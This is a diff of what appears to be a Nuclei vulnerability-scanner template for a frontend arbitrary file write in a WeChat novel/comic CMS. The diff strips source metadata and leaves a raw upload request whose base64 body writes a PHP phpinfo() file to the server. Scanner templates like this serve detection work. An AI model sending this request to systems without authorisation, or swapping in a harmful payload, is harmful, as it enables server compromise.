@@ -3,11 +3,8 @@ info:
   name: 微信公众号小说漫画系统前台任意文件写入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xspuf9ysk2vd7dpv'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xspuf9ysk2vd7dpv
 http:
 - raw:
   - 'POST /index.php?m=&c=IndexAjax&a=Upload HTTP/1.1
@@ -53,9 +50,7 @@ http:
     sec-ch-ua-platform: "Windows"
 
 
-    img=data:image/php;base64,YTw/cGhwIHBocGluZm8oKTs/Pg==&size=50
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728984908095-430f106b-b3db-41cb-916f-de79a57a2353.png)'
+    img=data:image/php;base64,YTw/cGhwIHBocGluZm8oKTs/Pg==&size=50'
   redirects: false
   matchers:
   - status:
